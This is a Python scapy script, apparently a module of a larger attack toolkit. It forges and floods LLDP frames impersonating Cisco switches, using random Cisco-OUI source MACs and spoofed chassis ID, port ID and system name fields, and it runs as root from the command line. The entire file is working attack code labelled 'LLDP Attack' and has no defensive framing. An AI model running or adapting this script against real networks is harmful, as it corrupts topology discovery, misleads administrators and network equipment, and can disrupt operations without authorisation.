from scapy.all import Ether, sendp
import argparse
import random
import struct

def execute(args):
    """Execute LLDP attack"""
    print(f"[LLDP Attack] Starting on interface {args.interface}")
    
    try:
        packets = generate_lldp_packets(
            args.count if args.count else 50,
            args.chassis_id if args.chassis_id else "Cisco-Switch-01",
            args.port_id if args.port_id else "GigabitEthernet1/0/1"
        )
        
        for i, packet in enumerate(packets):
            sendp(packet, iface=args.interface, verbose=args.verbose)
            if (i + 1) % 10 == 0:
                print(f"[LLDP Attack] Sent {i + 1}/{len(packets)} packets")
        
        print(f"[LLDP Attack] Sent {len(packets)} malicious LLDP packets")
        
        return True
        
    except Exception as e:
        print(f"[LLDP Attack] Error: {e}")
        return False

def generate_lldp_packets(count, chassis_id, port_id):
    """Generate malicious LLDP packets without scapy.contrib.lldp"""
    packets = []
    
    for i in range(count):
        # Generate random source MAC with Cisco OUI
        cisco_oui = "00:00:0c"
        nic_part = ":".join([f"{random.randint(0, 255):02x}" for _ in range(3)])
        src_mac = f"{cisco_oui}:{nic_part}"
        
        # Build LLDP payload manually
        lldp_payload = b""
        
        # Chassis ID TLV (Type 1)
        chassis_id_bytes = chassis_id.encode()
        lldp_payload += struct.pack(">H", 0x0200 + len(chassis_id_bytes))
        lldp_payload += b"\x04"
        lldp_payload += chassis_id_bytes
        
        # Port ID TLV (Type 2)
        port_id_bytes = port_id.encode()
        lldp_payload += struct.pack(">H", 0x0400 + len(port_id_bytes))
        lldp_payload += b"\x03"
        lldp_payload += port_id_bytes
        
        # TTL TLV (Type 3)
        lldp_payload += struct.pack(">HH", 0x0602, 120)
        
        # System Name TLV (Type 5) - Optional
        system_name = f"Cisco-Catalyst-{random.randint(2900, 3900)}"
        system_name_bytes = system_name.encode()
        lldp_payload += struct.pack(">H", 0x0a00 + len(system_name_bytes))
        lldp_payload += system_name_bytes
        
        lldp_payload += b"\x00\x00"
        
        lldp_packet = (
            Ether(dst="01:80:c2:00:00:0e", src=src_mac, type=0x88cc) /  
            lldp_payload
        )
        
        packets.append(lldp_packet)
    
    return packets

def add_arguments(parser):
    """Add LLDP attack specific arguments to parser"""
    parser.add_argument("--chassis-id", help="Chassis ID to spoof")
    parser.add_argument("--port-id", help="Port ID to spoof")
    parser.add_argument("--count", "-c", type=int, default=50, 
                       help="Number of LLDP packets to send")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="LLDP Attack")
    parser.add_argument("--interface", "-i", required=True, help="Network interface")
    parser.add_argument("--chassis-id", help="Chassis ID to spoof")
    parser.add_argument("--port-id", help="Port ID to spoof")
    parser.add_argument("--count", "-c", type=int, default=50, 
                       help="Number of LLDP packets to send")
    parser.add_argument("--verbose", "-v", action="store_true", help="Verbose output")
    
    args = parser.parse_args()
    
    import os
    if os.geteuid() != 0:
        print("[-] This script requires root privileges. Run with sudo.")
        exit(1)
    
    execute(args)